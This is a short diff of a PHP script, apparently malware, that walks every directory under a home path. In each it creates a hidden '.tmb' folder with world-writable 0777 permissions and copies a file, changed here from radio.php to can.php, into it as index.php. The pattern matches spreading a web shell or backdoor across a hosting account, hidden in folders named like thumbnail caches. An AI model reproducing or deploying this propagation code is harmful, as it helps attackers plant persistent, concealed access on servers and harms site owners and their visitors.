@@ -21,13 +21,13 @@ echo "<br>";
 
 
 ///////////Making directory & copy file//////////////  
-$filepath=getcwd()."/radio.php"; 
+$filepath=getcwd()."/can.php"; 
 
   $dirlist = getFileList($home, TRUE, 2);
   foreach($dirlist as $alldir){
     mkdir($alldir.".tmb", 0777, TRUE);
-    if(copy($filepath, $alldir.".tmb/radio.php")) {
-     echo $alldir.".tmb/radio.php<br>";}
+    if(copy($filepath, $alldir.".tmb/index.php")) {
+     echo $alldir.".tmb/index.php<br>";}
   }
   
   //////////////Directory scanner////////////////
